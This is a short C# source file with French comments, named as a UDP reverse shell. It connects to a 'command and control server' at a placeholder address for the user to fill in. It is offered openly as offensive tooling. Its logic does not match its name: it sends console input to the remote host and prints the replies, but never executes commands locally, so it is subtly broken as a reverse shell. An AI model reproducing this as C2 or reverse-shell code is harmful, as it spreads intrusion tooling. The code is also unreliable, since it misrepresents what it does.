using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace UDPReverseShell
{
    class Program
    {
        static void Main(string[] args)
        {
            // Adresse IP et port du serveur de commande et de contrôle
            string host = "192.168.0.1"; //Mettre votre IP
            int port = 8080; //Mettre votre port

            // Créer une nouvelle socket UDP pour se connecter au serveur
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            // Créer une nouvelle adresse IP et port pour se connecter au serveur
            IPEndPoint remoteEndPoint = new IPEndPoint(IPAddress.Parse(host), port);

            // Boucle principale pour envoyer et recevoir des données
            while (true)
            {
                // Récupérer la commande saisie par l'utilisateur
                Console.Write("Command: ");
                string command = Console.ReadLine();

                // Convertir la commande en tableau d'octets
                byte[] data = Encoding.ASCII.GetBytes(command);

                // Envoyer la commande au serveur
                socket.SendTo(data, remoteEndPoint);

                // Réinitialiser le tampon de réception
                data = new byte[1024];

                // Recevoir la réponse du serveur
                int received = socket.Receive(data);

                // Afficher la réponse du serveur
                Console.WriteLine(Encoding.ASCII.GetString(data, 0, received));
            }
        }
    }
}
